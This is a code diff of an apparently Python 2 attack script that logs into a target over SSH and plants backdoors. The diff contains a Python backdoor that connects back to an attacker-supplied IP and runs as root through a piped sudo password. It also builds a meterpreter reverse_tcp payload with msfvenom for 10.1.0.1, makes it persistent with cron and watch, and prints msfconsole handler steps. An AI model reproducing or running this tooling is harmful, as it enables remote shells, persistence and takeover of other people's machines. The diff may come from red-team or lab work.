@@ -26,56 +26,53 @@ def perlBackdoor():
 
 def pythBackdoor():
     newIP = ""
-    if(raw_input("Press y to continue with localhost ip " + localIP) == 'y'):
+    if(raw_input("Press y to continue with localhost ip " + localIP + ": ") == 'y'):
         newIP = localIP
     else:
-        newIP = raw_input("Please input the ip you want to use")
+        newIP = raw_input("Please input the ip you want to use: ")
 
-    toW = 'pythBackdoor.py'
-    part1 = 'pythPart1'
-    part2 = 'pythPart2'
+    toW = 'pythScript/pythBackdoor.py'
+#    part1 = 'pythScript/pythPart1'
+#    part2 = 'pythScriptpythPart2'
     stringToAdd = ""
     fileToWrite = open(toW, 'w')
 
-    with open ("pythPart1", "r") as myfile:
-        data=myfile.read()#.replace('\n', '')
-    data = data[:-1]
+    with open ("pythScript/pythPart1", "r") as myfile:
+        data=myfile.read()
+    data = data[:-1]#remove the last new line character.
     stringToAdd+=data + newIP
-#    stringToAdd+= newIP
-    print stringToAdd
-    #fileToWrite.write(data)
-    #fileToWrite.write(newIP)
     
-    with open ("pythPart2", "r") as myfile:
-        data=myfile.read()#.replace('\n', '')
-#    fileToWrite.write(data)
+    with open ("pythScript/pythPart2", "r") as myfile:
+        data=myfile.read()
     stringToAdd+=data
     fileToWrite.write(stringToAdd)
+    fileToWrite.close()
     raw_input("Enter the following command: nc -v -n -l -p 53922. Press enter")
     ssh.exec_command('rm pythBackdoor.py')
-    scpFiles('pythBackdoor.py', False)
+    scpFiles('pythScript/pythBackdoor.py', False)
     print("Moving the backdoor script.")
     ssh.exec_command("echo " +  pword + " | sudo -S nohup python pythBackdoor.py")
     print("Note: if you don't give me root, this won't be happy. Python backdoor on 53922 attempted.")
 
 def metasploitBackdoor():
      cron = (raw_input("Press y to start backdoor as a cronjob (recommended): ") == 'y')
-     os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
+     #os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
+     os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.1.0.1 LPORT=4444 -f elf X -o initd")
      scpFiles('initd', False)
      print("Backdoor sript moved")
      ssh.exec_command("chmod +x initd")
      if cron:
          ssh.exec_command("crontab -l > mycron")
-         ssh.exec_command("echo \"* * * * * ./initd\" >> mycron && crontab mycron && rm mycron")
-
-     ssh.exec_command("nohup ./initd > /dev/null &")
+         ssh.exec_command("echo \"*/1 * * * * ./initd\" >> mycron && crontab mycron && rm mycron")
      print("Backdoor attempted on port 4444.  To access, open msfconsole and run:")
      print("use multi/handler\n \
      > set PAYLOAD linux/x64/shell/reverse_tcp\n \
-     > set LHOST <LOCAL IP ADDRESS>\n \
+     > set LHOST %s\n \
      > set LPORT 4444\n \
-     > exploit")
-
+     > exploit", localIP)
+     #raw_input("Press any key to launch exploit once msfconsole is listening...")
+     ssh.exec_command("watch -n1 nohup ./initd > /dev/null &")
+     
 
 proc = subprocess.Popen(["ifconfig | grep inet | head -n1 | cut -d\  -f12 | cut -d: -f2"], stdout=subprocess.PIPE, shell=True)
 localIP = proc.stdout.read()
